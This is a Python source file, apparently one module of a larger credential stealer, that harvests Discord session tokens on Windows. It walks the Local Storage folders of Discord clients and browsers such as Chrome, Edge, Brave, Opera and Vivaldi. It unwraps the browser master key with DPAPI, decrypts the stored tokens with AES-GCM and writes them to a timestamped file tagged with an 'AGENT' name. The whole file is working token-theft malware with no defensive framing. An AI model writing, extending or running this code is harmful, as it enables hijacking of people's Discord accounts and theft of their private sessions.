import os
import re
import json
import base64
from typing import Optional, List, Dict

try:
    import win32crypt
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    win32crypt = None
    AES = None


def get_discord_paths() -> List[Dict[str, str]]:
    appdata = os.environ.get('APPDATA', '')
    localappdata = os.environ.get('LOCALAPPDATA', '')
    paths = []

    clients = [
        ('Discord', os.path.join(appdata, 'Discord', 'Local Storage', 'leveldb')),
        ('Discord Canary', os.path.join(appdata, 'discordcanary', 'Local Storage', 'leveldb')),
        ('Discord PTB', os.path.join(appdata, 'discordptb', 'Local Storage', 'leveldb')),
        ('Discord Development', os.path.join(appdata, 'discorddevelopment', 'Local Storage', 'leveldb')),
        ('Lightcord', os.path.join(appdata, 'Lightcord', 'Local Storage', 'leveldb')),
    ]
    for name, path in clients:
        paths.append({'name': name, 'path': path, 'type': 'discord'})

    browsers = [
        ('Chrome', os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')),
        ('Chrome SxS', os.path.join(localappdata, 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb')),
        ('Edge', os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb')),
        ('Brave', os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb')),
        ('Opera', os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb')),
        ('Opera GX', os.path.join(appdata, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb')),
        ('Yandex', os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb')),
        ('Vivaldi', os.path.join(localappdata, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb')),
    ]
    for name, path in browsers:
        paths.append({'name': name, 'path': path, 'type': 'browser'})

    return paths


def get_master_key_from_local_state(base_path: str) -> Optional[bytes]:
    parent = os.path.dirname(base_path)
    grandparent = os.path.dirname(parent)
    local_state_path = os.path.join(grandparent, 'Local State')
    if not os.path.exists(local_state_path):
        local_state_path = os.path.join(os.path.dirname(grandparent), 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            state = json.load(f)
        if 'os_crypt' not in state:
            return None
        encrypted_key = base64.b64decode(state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        if HAS_CRYPTO and win32crypt:
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        return None
    except Exception:
        return None


def decrypt_token(encrypted_token: str, master_key: bytes) -> Optional[str]:
    if not HAS_CRYPTO or not AES:
        return None
    try:
        encrypted_bytes = base64.b64decode(encrypted_token)
        if len(encrypted_bytes) < 15:
            return None
        iv = encrypted_bytes[3:15]
        payload = encrypted_bytes[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode('utf-8', errors='ignore')
    except Exception:
        return None


def is_valid_token(token: str) -> bool:
    patterns = [
        r'^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$',
        r'^mfa\.[\w-]{84}$',
        r'^[\w-]{24}\.[\w-]{6}\.[\w-]{38,}$',
    ]
    return any(re.match(p, token) for p in patterns)


def extract_tokens_from_path(path_info: Dict[str, str]) -> List[Dict[str, str]]:
    results = []
    path = path_info['path']
    source_name = path_info['name']
    source_type = path_info['type']

    if not os.path.exists(path):
        return results

    master_key = get_master_key_from_local_state(path)
    if not master_key:
        return results

    enc_pattern = re.compile(r'dQw4w9WgXcQ:([^"]*)')

    for file_name in os.listdir(path):
        if not file_name.endswith(('.log', '.ldb')):
            continue
        file_path = os.path.join(path, file_name)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            for match in enc_pattern.finditer(content):
                encrypted_token = match.group(1).strip()
                if not encrypted_token:
                    continue
                token = decrypt_token(encrypted_token, master_key)
                if token and is_valid_token(token):
                    results.append({
                        'source': source_name,
                        'type': source_type,
                        'token': token
                    })
        except Exception:
            continue
    return results


def get_all_discord_tokens() -> List[Dict[str, str]]:
    all_tokens = []
    paths = get_discord_paths()
    for path_info in paths:
        tokens = extract_tokens_from_path(path_info)
        all_tokens.extend(tokens)
    return all_tokens


class DiscordTokenManager:
    @staticmethod
    def get_tokens() -> List[Dict[str, str]]:
        return get_all_discord_tokens()

    @staticmethod
    def save_tokens_to_file(tokens: List[Dict[str, str]], output_dir: str, agent_name: str = "Unknown", prefix: str = "discord_tokens") -> str:
        if not tokens:
            return ""
        os.makedirs(output_dir, exist_ok=True)
        from datetime import datetime
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(output_dir, f"{prefix}_{timestamp}.txt")

        seen = set()
        unique = []
        for t in tokens:
            if t['token'] not in seen:
                seen.add(t['token'])
                unique.append(t)
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"AGENT: {agent_name}\n")
            f.write(f"DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            for idx, t in enumerate(unique, 1):
                f.write(f"{idx}) DISCORD : {t['token']}\n")
        return filename
